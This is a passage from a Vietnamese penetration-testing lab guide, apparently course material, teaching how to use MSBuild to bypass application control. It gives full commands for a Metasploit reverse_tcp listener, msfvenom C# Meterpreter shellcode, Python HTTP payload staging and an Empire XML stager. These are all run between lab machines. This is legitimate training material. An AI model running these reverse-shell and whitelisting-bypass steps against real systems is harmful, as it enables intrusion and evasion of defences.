@@ -5606,3 +5606,309 @@ exit -y
 ## Phần kết luận
 
 Tóm lại, trong bài thực hành này, bạn đã xác thực vào máy mục tiêu thông qua SMB với tư cách người dùng quản trị chỉ bằng mã băm của quản trị viên đó (không phải mật khẩu). Bạn đã truyền mã băm bằng psexecmô-đun của Metasploit. Những kỹ thuật này rất hữu ích cho các chuyên gia kiểm thử xâm nhập đã lấy được mã băm từ môi trường mục tiêu và có quyền truy cập *SMB vào các máy Windows mục tiêu.
+
+# Lab 4.4. MSBuild
+
+## Mục tiêu
+
+- Sử dụng MSBuild như một phương pháp bỏ qua việc kiểm soát ứng dụng.
+
+- Sử dụng tệp XML thử nghiệm để xuất ra văn bản đơn giản.
+
+- Sử dụng MSBuild với Metasploit/Meterpeter.
+
+- Sử dụng MSBuild với Empire.
+
+## Thiết lập phòng thí nghiệm
+
+Các máy ảo được sử dụng:
+
+- Slingshot Linux.
+
+- Windows 10.
+
+## Hướng dẫn thực hành từng bước
+
+### 1. Thiết lập
+
+Chúng ta sẽ sử dụng máy ảo Windows và Slingshot Linux cục bộ của bạn cho bài tập thực hành này. Trước tiên, hãy bắt đầu với một tệp XML mẫu để chứng minh rằng chúng ta có thể thực thi mã tùy ý bằng MSBuild.
+
+Trên máy tính Windows của bạn, hãy mở `build1.xml` tệp trong `CourseFiles` thư mục được liên kết trên màn hình máy tính.
+
+![alt text](IMG/LAB4/LAB4.4/image.png)
+
+Chúng tôi sẽ thay thế dòng mã được đánh dấu bên dưới bằng đoạn mã mà chúng tôi đã chọn.
+
+```bash
+# Văn bẳn gốc
+public override bool Execute()
+{
+PUT CODE TO EXECUTE HERE;
+return true;
+}
+```
+
+### 2. Thử nghiệm ban đầu
+
+Thay thế dòng này:
+
+```bash
+PUT CODE TO EXECUTE HERE;
+```
+
+Với đoạn mã này:
+
+```bash
+Console.WriteLine("Hello SEC560!");
+```
+
+Mã thay thế sẽ chỉ in ra "Hello SEC560!" . Toàn bộ tệp XML sẽ trông như thế này:
+
+![alt text](IMG/LAB4/LAB4.4/image-1.png)
+
+Hãy lưu tập tin của bạn `build1.xml`. Bây giờ, hãy mở cửa sổ Command Prompt (CMD, không phải PowerShell) và tìm kiếm `MSBuild.exe` bằng lệnh sau. Trong trường hợp này, CMD nhanh hơn, hiệu quả hơn và cho kết quả ngắn gọn hơn.
+
+```bash
+dir /b /s C:\msbuild.exe
+```
+
+![alt text](IMG/LAB4/LAB4.4/image-2.png)
+
+Hãy chọn tệp MSBuild.exe sau:
+
+`C:\Windows\Microsoft.NET\assembly\GAC_32\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe`.
+
+Đây là phiên bản 32-bit, vì vậy shellcode của chúng ta cũng cần phải là 32-bit. Nếu bạn chọn một phiên bản MSBuild khác ở trên, bạn sẽ phải thay đổi payload cho phù hợp.
+
+Hãy sao chép tên tệp và đường dẫn, rồi dán vào cửa sổ dòng lệnh:
+
+- `1`. Kéo chuột để chọn đường dẫn.
+
+- `2`. Nhấn Enter để sao chép đường dẫn đã chọn vào clipboard.
+
+- `3`. Nhấp chuột phải để dán.
+
+Sau đó, bạn có thể kéo `build1.xml` tệp đã cập nhật vào cửa sổ dòng lệnh (hoặc nhập đường dẫn đầy đủ đến tệp). Lệnh của bạn sẽ trông như thế này:
+
+```bash
+C:\Windows\Microsoft.NET\assembly\GAC_32\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe C:\CourseFiles\build1.xml
+```
+
+![alt text](IMG/LAB4/LAB4.4/image-3.png)
+
+Nếu bạn nhận được thông báo lỗi, hãy kiểm tra lại xem bạn đã thêm mã chưa. Đồng thời, hãy chắc chắn rằng bạn đã thêm dấu chấm phẩy (`;`) ở cuối dòng.
+
+### 3. Mã Shellcode của Meterpreter
+
+Trước tiên, hãy đảm bảo các máy ảo của chúng ta có thể giao tiếp với nhau. Trong Windows, hãy thử ping eth0địa chỉ IP của giao diện máy chủ Linux.
+
+```bash
+ping 10.130.10.128
+```
+
+![alt text](IMG/LAB4/LAB4.4/image-4.png)
+
+Chúng ta hãy chuyển sang Linux để có thể sử dụng Metasploit và msfvenom.
+
+Đầu tiên, chúng ta hãy khởi chạy `msfconsole` và thiết lập một trình lắng nghe để nhận kết nối từ gói dữ liệu mới của chúng ta.
+
+```bash
+msfconsole
+```
+
+Chúng ta sẽ thiết lập các tùy chọn sau:
+
+- Khai thác lỗ hổng: `use exploit/multi/handler`.
+
+- Nội dung tải: `set payload windows/meterpreter/reverse_tcp`.
+
+- LHOST: `set lhost 0.0.0.0` (0.0.0.0 sẽ lắng nghe trên tất cả các giao diện).
+
+- LPORT: `set lport 3333`.
+
+Sau đó, chúng ta sẽ xác nhận các cài đặt đã chính xác và khởi động trình lắng nghe bằng cách thực thi `run` lệnh.
+
+```bash
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 0.0.0.0
+set lport 3333
+```
+
+![alt text](IMG/LAB4/LAB4.4/image-6.png)
+
+Xác nhận cài đặt của bạn.
+
+```bash
+show options
+```
+
+![alt text](IMG/LAB4/LAB4.4/image-5.png)
+
+Bây giờ, hãy bắt đầu trình xử lý.
+
+```bash
+run
+```
+
+![alt text](IMG/LAB4/LAB4.4/image-7.png)
+
+Mở một cửa sổ terminal mới. Chúng ta cần tạo shellcode bằng cách sử dụng msfvenom. Sử dụng lệnh bên dưới, nhưng hãy chắc chắn rằng bạn sử dụng địa chỉ IP Linux của mình cho eth0.
+
+Trước tiên, hãy cùng xem xét các định dạng đầu ra của dữ liệu tải trọng.
+
+![alt text](IMG/LAB4/LAB4.4/image-8.png)
+
+Trong danh sách bạn sẽ thấy `csharp`, đó là shellcode ở định dạng byte tương thích với ngôn ngữ lập trình C#.
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp lhost=eth0 lport=3333 -f csharp | tee /tmp/payload.txt
+```
+
+![alt text](IMG/LAB4/LAB4.4/image-9.png)
+
+Chúng ta cần chuyển tập tin này sang Windows. Hãy chuyển đến /tmpthư mục đó và khởi chạy một máy chủ HTTP đơn giản.
+
+```bash
+cd /tmp
+python3 -m http.server
+```
+
+Quay lại Windows và truy cập địa chỉ IP Linux của bạn trên cổng 8000. Sau đó mở `payload.txt` tệp tin.
+
+![alt text](IMG/LAB4/LAB4.4/image-10.png)
+
+Sao chép toàn bộ văn bản từ payload.txtvà dán vào build2.xmlngay bên dưới dòng có nội dung // PUT YOUR SHELLCODE HERE;. Lưu ý rằng khoảng cách thụt lề không quan trọng.
+
+![alt text](IMG/LAB4/LAB4.4/image-11.png)
+
+Hãy lưu `build2.xml` tập tin của bạn. Giờ thì, hãy phóng phần mềm độc hại của chúng ta!
+
+```bash
+C:\Windows\Microsoft.NET\assembly\GAC_32\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe C:\CourseFiles\build2.xml
+```
+
+![alt text](IMG/LAB4/LAB4.4/image-12.png)
+
+Sau đó, cửa sổ terminal sẽ chờ, vì lúc này chúng ta đã có một phiên làm việc trong Metasploit.
+
+![alt text](IMG/LAB4/LAB4.4/image-13.png)
+
+```bash
+sysinfo
+```
+
+![alt text](IMG/LAB4/LAB4.4/image-14.png)
+
+```bash
+getuid
+```
+
+![alt text](IMG/LAB4/LAB4.4/image-15.png)
+
+Thoát khỏi Metasploit.
+
+```bash
+exit -y
+```
+
+### 4. Empire
+
+Việc xây dựng payload cho Metasploit khá rắc rối. Giờ chúng ta hãy sử dụng Empire để tạo một tập tin XML.
+
+Trước tiên, hãy khởi động máy chủ.
+
+```bash
+cd /opt/empire
+sudo ./ps-empire server
+```
+
+![alt text](IMG/LAB4/LAB4.4/image-16.png)
+
+![alt text](IMG/LAB4/LAB4.4/image-17.png)
+
+Trong một cửa sổ khác , hãy khởi động ứng dụng khách.
+
+```bash
+cd /opt/empire
+./ps-empire client
+```
+
+Đầu tiên, chúng ta cần cấu hình một trình lắng nghe để nhận kết nối. Nếu bạn đã có trình lắng nghe từ bài thực hành trước, hãy sử dụng nó!
+
+```bash
+uselistener http
+```
+
+![alt text](IMG/LAB4/LAB4.4/image-18.png)
+
+Chúng ta cần cấu hình và chạy trình lắng nghe.
+
+```bash
+set Host http://10.130.10.128:9999
+set Port 9999
+execute
+```
+
+![alt text](IMG/LAB4/LAB4.4/image-19.png)
+
+Bây giờ, chúng ta hãy xây dựng tệp trình khởi chạy XML của mình.
+
+![alt text](IMG/LAB4/LAB4.4/image-20.png)
+
+Chúng ta cần thiết lập `Listener` rồi mới tạo dữ liệu.
+
+```bash
+set Listener http
+generate
+```
+
+![alt text](IMG/LAB4/LAB4.4/image-21.png)
+
+Như chúng ta thấy ở trên, tệp XML nằm ở vị trí /opt/empire/empire/client/generated-stagers/launcher.xml. Mở một cửa sổ terminal mới, di chuyển đến /opt/empire/empire/client/generated-stagers/thư mục đó và khởi chạy máy chủ web Python.
+
+```bash
+cd /opt/empire/empire/client/generated-stagers
+python3 -m http.server
+```
+
+![alt text](IMG/LAB4/LAB4.4/image-22.png)
+
+Mở Windows và truy cập địa chỉ IP của máy Linux trên cổng 8000. Nhấp chuột launcher.xml và lưu tệp vào màn hình nền Windows của bạn. Sau đó, chạy MSBuild bằng tệp vừa lưu.
+
+![alt text](IMG/LAB4/LAB4.4/image-23.png)
+
+Hãy chạy tệp XML và lấy một đặc vụ của Empire!
+
+![alt text](IMG/LAB4/LAB4.4/image-24.png)
+
+Lệnh sẽ có vẻ bị treo... vì chúng ta vừa hạ cánh một đặc vụ của Đế chế!
+
+![alt text](IMG/LAB4/LAB4.4/image-25.png)
+
+Chúng ta hãy cùng xem xét về người đại diện này.
+
+![alt text](IMG/LAB4/LAB4.4/image-26.png)
+
+### 5. Bonus
+
+Nếu bạn có thêm thời gian, hãy biên dịch các payload Meterpreter 64-bit và thử nghiệm chúng với MSBuild 64-bit.
+
+### 6. Dọn dẹp
+
+Hãy tiêu diệt các đặc vụ và người nghe lén của bạn, sau đó đóng Empire lại.
+
+```bash
+agents
+kill all
+y
+listeners
+kill all
+exit
+y
+```
+
+## Kết luận
+
+Chúng tôi chỉ cần chạy đoạn mã mình chọn bằng cách sử dụng tệp nhị phân đã được Microsoft ký. Luôn có những kỹ thuật mới để làm điều này. Không giống như các phương pháp vượt qua phần mềm diệt virus/EDR, các phương pháp vượt qua kiểm soát ứng dụng có thời gian tồn tại lâu hơn nhiều.
+
